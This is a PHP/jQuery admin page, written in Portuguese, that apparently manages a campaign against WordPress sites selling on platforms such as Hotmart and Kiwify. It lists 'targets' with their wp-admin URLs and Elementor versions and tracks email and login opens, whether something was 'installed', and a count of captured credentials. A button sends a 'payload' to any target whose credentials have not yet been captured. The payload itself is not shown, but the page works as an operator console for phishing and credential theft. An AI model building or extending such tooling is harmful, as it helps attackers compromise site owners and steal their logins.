<?php


function getLabel($plataforma) {
    
    if ($plataforma == 1) {
        return "Hotmart";
    } else if ($plataforma == 2) {
        return "Kiwify";
    } else if ($plataforma == 3) {
        return "Monetizze";
    } else if ($plataforma == 4) {
        return "Edduz";
    } else if ($plataforma == 5) {
        return "Pepper";
    } else {
        return "Desconhecida";
    }
}

?>

<!DOCTYPE html>
<html>

<head>
    <title>Tabela com DataTables</title>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.25/css/jquery.dataTables.css">
</head>
<style>
    body {
        text-align: center;
        /* color:#FFF; */
        background-color: #d9d9d9;
    }

    input {
        width: 200px;
        height: 40px;
        padding: 5px;
    }
</style>

<body>

    <section style="margin-left:100px;margin-right:100px;margin-top:50px">


        <form action="" id="form-add-alvo">
            <label for="">NOME</label><br>
            <input type="text" name="alvo_nome">
            <br><br>
            <label for="">SITE</label><br>
            <input type="text" name="alvo_url">
            <br><br>
            <label for="">EMAIL</label><br>
            <input type="email" name="alvo_email">
            <br><br>
            
            <label for="">PLATAFORMA</label><br>
            <select style="width:250px;height:50px" name="alvo_plataforma">
                    <option value="1" selected >Hotmart</option>
                                        <option  value="2" >Kiwify</option>

                    <option value="3" >Monetizze</option>
                    <option value="4" >Edduz</option>
                    <option value="5" >Pepper</option>

            </select>
            <br><br>
            <button type="submit" style="background:orange;height:40px;color:#FFF">ADICIONAR</button>

        </form>


        <table id="tabelaAlvos" class="">
            <thead>
                <tr>
                    <th>Data</th>
                    <th>Platforma</th>
                    <th>Nome</th>
                    <th>URL</th>
                    <th>LP</th>
                    <th>Elementor Vrs.</th>
                    <th>Email</th>
                    <th>Email Abr</th>
                    <th>Logins Abr</th>
                    <th>Páginas Abr</th>
                    <th>Envios</th>
                     <th>Instalado</th>
                    <th>Credenciais cpt</th>
                    <th>Payload</th>
                    
                   
                    <th>Action</th>

                </tr>
            </thead>
            <tbody>
                <!-- Os dados da tabela seriam preenchidos dinamicamente a partir de uma fonte de dados, como um banco de dados -->

                <?php foreach ($this->main_model->getalvos() as $c) { ?>
                    <tr>
                        <td><?= $c->alvo_data ?></td>
                                                <td><?=getLabel($c->alvo_plataforma); ?></td>

                        <td><input type="text" value="<?= $c->alvo_nome ?>" class="alvo_nome" id="<?=$c->id?>"></td>
                        <td><a target="_blank" href="https://<?= $c->alvo_url ?>/wp-admin"><?= $c->alvo_url ?></a></td>
                        <td><a target="_blank" href="<?= $c->alvo_produto_link ?>">ACESSAR</a></td>
                        <td><?= $c->alvo_elementor ?></td>

                        <td><?= $c->alvo_email ?></td>
                        <td><?= $c->alvo_email_abertura ?></td>
                        <td><?= $c->alvo_login_abertura ?></td>
                        <td><?= $c->alvo_pagina_abertura ?></td>
                        <td><?= $c->alvo_envios ?></td>
                        <td><?= $c->alvo_instalado ?></td>
                        <td><a href="<?= base_url() ?>alvos/credenciais/<?= $c->alvo_url ?>"><?= count($this->main_model->countCredenciaisByUrl($c->alvo_url)); ?></a></td>
                        <td>
                            <?php if ( count($this->main_model->countCredenciaisByUrl($c->alvo_url)) == 0) { ?>
                            <button class="enviar-payload" nome="<?= $c->alvo_nome ?>" ref="<?= $c->alvo_ref ?>" email="<?= $c->alvo_email ?>" url="<?= $c->alvo_url ?>">ENVIAR P1 >></button>
                            <?php } ?>
                        </td>
                        <td>
                            <button class="delete-alvo" id="<?= $c->id ?>">X</button>
                        </td>
                    </tr>
                <?php } ?>


                <!-- Adicione mais linhas conforme necessário -->
            </tbody>
        </table>
    </section>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.25/js/jquery.dataTables.js"></script>
    <script>
        $(document).ready(function() {
            $('#tabelaAlvos').DataTable();
        });
    </script>
    <script>
    
        $('.alvo_nome').on('change', function(e) {
            alvo_nome = $(this).val()
            alvo_id = $(this).attr('id')
            
             $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_update_alvo',
                data: {
                    alvo_nome: alvo_nome,
                    alvo_id: alvo_id
                  
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Alterado com sucesso!')
                      
                    } else {
                        alert('Erro ao alterar')
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                }
            });
        })
        
        $('.enviar-payload').on('click', function(e) {

            var nome = $(this).attr('nome')
            var email = $(this).attr('email')
            var url = $(this).attr('url')
            var ref = $(this).attr('ref')

            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_send_payload',
                data: {
                    alvo_url: url,
                    alvo_email: email,
                    alvo_nome: nome,
                    alvo_ref: ref,
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        console.log('Enviado com sucesso!'+nome)
                        // location.reload()

                    } else {
                        console.log('Erro ao enviar'+nome)
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })

        $('.delete-alvo').on('click', function(e) {

            var id = $(this).attr('id')


            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_delete_alvo',
                data: {
                    alvo_id: id,

                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Excluido com sucesso!')
                        location.reload()

                    } else {
                        alert('Erro ao excluir')
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })

        $('#form-add-alvo').on('submit', function(e) {

            e.preventDefault()

            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_add_alvo',
                data: $(this).serialize(),
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        alert('Adicionado com sucesso!')
                        location.reload()

                    } else {
                        alert(resp.message)
                    }
                },
                error: function(data) {
                    alert('Ocorreu um erro temporário.');
                },
            });
        })
    </script>
</body>

</html>